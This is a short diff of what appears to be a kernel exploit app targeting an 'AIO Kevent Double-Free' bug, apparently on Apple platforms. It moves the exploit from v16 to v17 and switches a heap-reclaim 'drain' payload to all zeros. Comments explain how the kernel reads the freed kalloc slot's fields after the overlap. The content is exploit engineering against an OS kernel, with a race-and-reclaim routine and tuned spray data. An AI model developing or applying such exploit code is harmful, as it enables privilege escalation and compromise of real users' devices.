@@ -5681,7 +5681,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v16 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v17 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5950,7 +5950,10 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     enum { kDrainOolSize = 256 };
     uint8_t *drainPayload = (uint8_t *)calloc(1, kDrainOolSize);
     if (drainPayload) {
-        for (int i = 0; i < kDrainOolSize; i++) drainPayload[i] = (uint8_t)i;
+        // All zeros — clean entry state (no error, buf=0, fd=0, procp=0)
+        // If aio_error returns 0 after overlap, the kernel reads these
+        // fields directly from the kalloc slot (not cached from completion).
+        memset(drainPayload, 0, kDrainOolSize);
     }
 
     typedef struct {
